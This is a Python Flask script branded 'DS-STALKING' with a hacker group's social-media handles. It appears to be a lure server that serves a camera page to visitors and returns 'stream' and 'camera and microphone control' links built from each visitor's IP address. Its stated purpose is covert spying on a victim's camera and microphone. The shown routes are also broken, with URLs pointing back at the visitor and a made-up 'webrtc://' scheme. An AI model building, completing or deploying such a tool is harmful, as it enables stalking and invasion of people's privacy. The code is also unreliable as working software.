from flask import Flask, render_template, request, jsonify
import socket
import pyfiglet

# Créer une interface ASCII art avec pyfiglet
def display_interface():
    custom_fig = pyfiglet.Figlet(font="small")
    ascii_art_text = custom_fig.renderText("DS-STALKING")
    info = [
        "BY: 2806",
        "Telegram: t.me/Mr_2806",
        "Tiktok: dedsec_x.0",
        "Youtube: Dedsec assistant"
    ]
    border = "=" * 40
    print(border)
    print(ascii_art_text)
    for line in info:
        print(f"  {line}")
    print(border)

# Afficher l'interface ASCII au démarrage
display_interface()

# Initialiser l'application Flask
app = Flask(__name__)

# Obtenir l'adresse IP locale
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

@app.route("/")
def home():
    # Cette fonction rend le fichier camera.html lorsqu'on visite la page d'accueil
    return render_template("camera.html")

@app.route("/stream_link", methods=["POST"])
def stream_link():
    # Génère un lien contenant l'adresse IP et le port pour la caméra
    client_ip = request.remote_addr
    port = 5000  # Remplacez si nécessaire
    stream_url = f"http://{client_ip}:{port}/stream"
    return jsonify({"stream_url": stream_url})

@app.route("/control_camera", methods=["POST"])
def control_camera():
    # Lien pour contrôler la caméra et le microphone
    client_ip = request.remote_addr
    control_url = f"webrtc://{client_ip}:5000"  # WebRTC URL ou une autre méthode d'accès à la caméra
    return jsonify({"control_url": control_url})

if __name__ == "__main__":
    # Exécuter le serveur Flask
    local_ip = get_local_ip()
    print(f"Serveur en cours d'exécution : http://{local_ip}:4444")
    app.run(host="0.0.0.0", port=4444)  # Démarrer le serveur sur le port 4444